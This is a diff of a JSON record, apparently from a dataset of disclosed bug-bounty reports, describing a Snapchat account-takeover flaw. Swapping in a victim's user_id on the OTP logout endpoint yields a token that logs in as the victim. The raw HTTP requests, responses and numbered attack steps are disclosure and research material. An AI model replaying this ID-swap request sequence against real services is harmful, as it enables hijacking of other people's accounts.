@@ -1,60 +1,60 @@
 {
-    "reported_to": "Snapchat",
-    "reported_by": "korniltsev ",
-    "title": "Improper Authentication - any user can login as other user with otp/logout & otp/login",
-    "content": "\n'/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim.\nI will demonstrate the problem on two accounts.\nVictim: \u2588\u2588\u2588\nAttacker: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAttacker perform a usuall login to attacker's personal account.\nAttacker performs /scauth/otp/droid/logout but instead of attacker's user_id, attacker provides victim's user_id request\nCode 482 Bytes\n1POST /scauth/otp/droid/logout HTTP/1.1\n2Host: gcp.api.snapchat.com\n3Connection: close\n4Content-Length: 168\n5X-Snapchat-Client-Auth: \u2588\u2588\u2588\u2588\u2588\u2588\n6X-Snapchat-UUID: \u2588\u2588\u2588\n7x-snapchat-userid: \u2588\u2588\u2588\u2588\u2588\n8username: \u2588\u2588\u2588\n9req_token: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n10timestamp: 1594604280000\n11Accept: application/json\n12User-Agent: Snapchat/10.78.1.0 \u2588\u2588\u2588\u2588\u2588\n13Accept-Language: en-GB;q=1, en;q=0.9\n14Content-Type: application/json; charset=utf-8\n15Accept-Encoding: gzip, deflate\n16\n17{\"user_id\":\"\u2588\u2588\u2588\u2588\",\"device_id\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"device_name\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"}\nresponse\nCode 696 Bytes\n1HTTP/1.1 200 OK\n2date: Mon, 13 Jul 2020 01:39:18 GMT\n3content-type: application/json;charset=utf-8\n4vary: Accept-Encoding\n5x-cloud-trace-context: 4ea579062bff12ec2ef2162a59116f2e\n6server: API Gateway\n7cache-control: no-cache, no-store\n8x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.\n9x-snapchat-request-id: \u2588\u2588\u2588\u2588\u2588\n10x-snapchat-server-latency: 342\n11strict-transport-security: max-age=31536000; includeSubDomains\n12Via: 1.1 google, 1.1 google\n13Alt-Svc: h3-Q050=\":443\"; ma=2592000,h3-Q046=\":443\"; ma=2592000,h3-Q043=\":443\"; ma=2592000,quic=\":443\"; ma=2592000; v=\"46,43\"\n14Connection: close\n15Content-Length: 137\n16\n17{\"status\":\"SUCCESS\",\"user_id\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"token\":\"\u2588\u2588\u2588\u2588\u2588\",\"expiry_hint\":\u2588\u2588\u2588\u2588}\nNotice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token.\nAttacker performs /scauth/otp/login request with username equal victim's username, and the token obtained on previous step.\nCode 756 Bytes\n1POST /scauth/otp/login HTTP/1.1\n2Host: gcp.api.snapchat.com\n3Connection: close\n4Content-Length: 6213\n5X-Snapchat-Client-Auth: \u2588\u2588\u2588\u2588\u2588\u2588\n6X-Snapchat-UUID: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n7User-Agent: Snapchat/10.78.1.0 \u2588\u2588\u2588\u2588\u2588\u2588\n8Accept: application/json\n9Accept-Language: en-GB;q=1, en;q=0.9\n10Content-Type: application/x-www-form-urlencoded; charset=utf-8\n11Accept-Encoding: gzip, deflate\n12\n13application_id=com.snap.framework&attestation=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&device_id=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&dsig=\u2588\u2588\u2588\u2588\u2588&dtoken1i=\u2588\u2588\u2588\u2588\u2588\u2588&fidelius_client_init=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&height=1920&max_video_height=1920&max_video_width=1080&password=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&reactivation_confirmed=false&req_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=\u2588\u2588\u2588\u2588&username=\u2588\u2588\u2588\u2588\u2588&width=1080\nresponse\nCode 738 Bytes\n1HTTP/1.1 200 OK\n2date: Mon, 13 Jul 2020 01:40:18 GMT\n3content-type: application/json;charset=utf-8\n4vary: Accept-Encoding,Accept-Encoding\n5x-cloud-trace-context: f88a46255f8542b12008295d77cf1b5c\n6server: API Gateway\n7cache-control: no-cache, no-store\n8x-snap-refresh-token: \u2588\u2588\u2588\u2588\n9x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.\n10x-snap-access-tokens: \u2588\u2588\u2588\n11x-snapchat-request-id: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n12strict-transport-security: max-age=31536000; includeSubDomains\n13Via: 1.1 google, 1.1 google\n14Alt-Svc: h3-Q050=\":443\"; ma=2592000,h3-Q046=\":443\"; ma=2592000,h3-Q043=\":443\"; ma=2592000,quic=\":443\"; ma=2592000; v=\"46,43\"\n15Connection: close\n16Content-Length: 138867\n17\n18{\"updates_response\":{\"logged\":true,\"username\":\"\u2588\u2588\u2588\u2588\u2588\",\"user_id\":\"\u2588\u2588\u2588\u2588\u2588\",...\nAn attacker successfully performed login as victim.\nVictim's user_id can be easily obtained with friends request.\nI've attached the following:\na screencast to showcase the problem.\nburp project \u2588\u2588\u2588\u2588\nlogout+login raw requests exported from burp\na python script to perform the attack\nI've tested this bug only on my personal accounts.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nAn attacker is able to login as any user.\n\n",
-    "severity": [
-        9.3,
-        null
+  "reported_to": "Snapchat",
+  "reported_by": "korniltsev ",
+  "title": "Improper Authentication - any user can login as other user with otp/logout & otp/login",
+  "content": "\n'/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker passes user_id of victim account he can login as victim.\nI will demonstrate the problem on two accounts.\nVictim: \u2588\u2588\u2588\nAttacker: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAttacker perform a usuall login to attacker's personal account.\nAttacker performs /scauth/otp/droid/logout but instead of attacker's user_id, attacker provides victim's user_id request\nCode 482 Bytes\n1POST /scauth/otp/droid/logout HTTP/1.1\n2Host: gcp.api.snapchat.com\n3Connection: close\n4Content-Length: 168\n5X-Snapchat-Client-Auth: \u2588\u2588\u2588\u2588\u2588\u2588\n6X-Snapchat-UUID: \u2588\u2588\u2588\n7x-snapchat-userid: \u2588\u2588\u2588\u2588\u2588\n8username: \u2588\u2588\u2588\n9req_token: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n10timestamp: 1594604280000\n11Accept: application/json\n12User-Agent: Snapchat/10.78.1.0 \u2588\u2588\u2588\u2588\u2588\n13Accept-Language: en-GB;q=1, en;q=0.9\n14Content-Type: application/json; charset=utf-8\n15Accept-Encoding: gzip, deflate\n16\n17{\"user_id\":\"\u2588\u2588\u2588\u2588\",\"device_id\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"device_name\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"}\nresponse\nCode 696 Bytes\n1HTTP/1.1 200 OK\n2date: Mon, 13 Jul 2020 01:39:18 GMT\n3content-type: application/json;charset=utf-8\n4vary: Accept-Encoding\n5x-cloud-trace-context: 4ea579062bff12ec2ef2162a59116f2e\n6server: API Gateway\n7cache-control: no-cache, no-store\n8x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.\n9x-snapchat-request-id: \u2588\u2588\u2588\u2588\u2588\n10x-snapchat-server-latency: 342\n11strict-transport-security: max-age=31536000; includeSubDomains\n12Via: 1.1 google, 1.1 google\n13Alt-Svc: h3-Q050=\":443\"; ma=2592000,h3-Q046=\":443\"; ma=2592000,h3-Q043=\":443\"; ma=2592000,quic=\":443\"; ma=2592000; v=\"46,43\"\n14Connection: close\n15Content-Length: 137\n16\n17{\"status\":\"SUCCESS\",\"user_id\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"token\":\"\u2588\u2588\u2588\u2588\u2588\",\"expiry_hint\":\u2588\u2588\u2588\u2588}\nNotice an attacker replaced user_id with victim's user_id and the server responded with victim's user_id and given us otp token. Now let's login with the token.\nAttacker performs /scauth/otp/login request with username equal victim's username, and the token obtained on previous step.\nCode 756 Bytes\n1POST /scauth/otp/login HTTP/1.1\n2Host: gcp.api.snapchat.com\n3Connection: close\n4Content-Length: 6213\n5X-Snapchat-Client-Auth: \u2588\u2588\u2588\u2588\u2588\u2588\n6X-Snapchat-UUID: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n7User-Agent: Snapchat/10.78.1.0 \u2588\u2588\u2588\u2588\u2588\u2588\n8Accept: application/json\n9Accept-Language: en-GB;q=1, en;q=0.9\n10Content-Type: application/x-www-form-urlencoded; charset=utf-8\n11Accept-Encoding: gzip, deflate\n12\n13application_id=com.snap.framework&attestation=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&device_id=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&dsig=\u2588\u2588\u2588\u2588\u2588&dtoken1i=\u2588\u2588\u2588\u2588\u2588\u2588&fidelius_client_init=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&height=1920&max_video_height=1920&max_video_width=1080&password=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&reactivation_confirmed=false&req_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=\u2588\u2588\u2588\u2588&username=\u2588\u2588\u2588\u2588\u2588&width=1080\nresponse\nCode 738 Bytes\n1HTTP/1.1 200 OK\n2date: Mon, 13 Jul 2020 01:40:18 GMT\n3content-type: application/json;charset=utf-8\n4vary: Accept-Encoding,Accept-Encoding\n5x-cloud-trace-context: f88a46255f8542b12008295d77cf1b5c\n6server: API Gateway\n7cache-control: no-cache, no-store\n8x-snap-refresh-token: \u2588\u2588\u2588\u2588\n9x-snapchat-notice: Snapchat Private APIs - Unauthorized use is prohibited.\n10x-snap-access-tokens: \u2588\u2588\u2588\n11x-snapchat-request-id: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n12strict-transport-security: max-age=31536000; includeSubDomains\n13Via: 1.1 google, 1.1 google\n14Alt-Svc: h3-Q050=\":443\"; ma=2592000,h3-Q046=\":443\"; ma=2592000,h3-Q043=\":443\"; ma=2592000,quic=\":443\"; ma=2592000; v=\"46,43\"\n15Connection: close\n16Content-Length: 138867\n17\n18{\"updates_response\":{\"logged\":true,\"username\":\"\u2588\u2588\u2588\u2588\u2588\",\"user_id\":\"\u2588\u2588\u2588\u2588\u2588\",...\nAn attacker successfully performed login as victim.\nVictim's user_id can be easily obtained with friends request.\nI've attached the following:\na screencast to showcase the problem.\nburp project \u2588\u2588\u2588\u2588\nlogout+login raw requests exported from burp\na python script to perform the attack\nI've tested this bug only on my personal accounts.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nAn attacker is able to login as any user.\n\n",
+  "severity": [
+    9.3,
+    null
+  ],
+  "bounty": 25000,
+  "weaknesses": [
+    "Improper Authentication - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1630674720,
+  "report_url": "https://hackerone.com/reports/921780",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Attacker logs into their own account normally."
     ],
-    "bounty": 25000,
-    "weaknesses": [
-        "Improper Authentication - Generic"
+    [
+      2,
+      "Attacker sends a POST request to '/scauth/otp/droid/logout' with the victim's user_id instead of their own."
     ],
-    "screenshots": {},
-    "disclosed_date": 1630674720,
-    "report_url": "https://hackerone.com/reports/921780",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Attacker logs into their own account normally."
-        ],
-        [
-            2,
-            "Attacker sends a POST request to '/scauth/otp/droid/logout' with the victim's user_id instead of their own."
-        ],
-        [
-            3,
-            "Server responds with a token for the victim's account."
-        ],
-        [
-            4,
-            "Attacker uses the obtained token to send a POST request to '/scauth/otp/login' with the victim's username."
-        ],
-        [
-            5,
-            "Attacker successfully logs in as the victim."
-        ]
+    [
+      3,
+      "Server responds with a token for the victim's account."
     ],
-    "vuln_description": "The vulnerability allows an attacker to impersonate any user by manipulating the user_id parameter in the logout request to obtain a valid OTP token for the victim's account, which can then be used to log in as the victim.",
-    "reason": "The attack involves understanding the OTP authentication flow, manipulating the logout request to target a victim's account, and then using the obtained token to log in. While the steps are straightforward, the interaction between the logout and login processes is non-obvious and requires knowledge of how the OTP tokens are generated and validated.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": true,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": true,
-        "authnz_byppass_detectable": true
-    }
+    [
+      4,
+      "Attacker uses the obtained token to send a POST request to '/scauth/otp/login' with the victim's username."
+    ],
+    [
+      5,
+      "Attacker successfully logs in as the victim."
+    ]
+  ],
+  "vuln_description": "The vulnerability allows an attacker to impersonate any user by manipulating the user_id parameter in the logout request to obtain a valid OTP token for the victim's account, which can then be used to log in as the victim.",
+  "reason": "The attack involves understanding the OTP authentication flow, manipulating the logout request to target a victim's account, and then using the obtained token to log in. While the steps are straightforward, the interaction between the logout and login processes is non-obvious and requires knowledge of how the OTP tokens are generated and validated.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves swapping user_ids in the logout request to obtain an OTP token for another user, which is then used to login as that user. This fits the methodology of testing (user_session, action, resource_id) tuples where the resource_id (user_id) is swapped with another user's ID. The methodology would detect this by executing the logout action with different user_ids and observing if the server returns a valid OTP token for unauthorized users.",
+    "is_detectable": true
+  }
 }
